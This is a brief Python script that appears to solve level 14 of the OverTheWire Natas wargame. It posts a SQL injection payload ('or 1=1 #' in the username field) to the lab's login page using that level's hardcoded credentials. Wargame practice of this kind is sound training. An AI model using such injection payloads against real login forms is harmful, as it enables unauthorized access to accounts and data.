import requests
from requests.auth import HTTPBasicAuth

HOST = 'http://natas14.natas.labs.overthewire.org/index.php?debug=1'
auth = HTTPBasicAuth('natas14', 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1')
username = '''natas15" or 1=1 # '''
password = '''a'''

data = dict(username=username, password=password)
r = requests.post(HOST, data=data, auth=auth)
print r.content
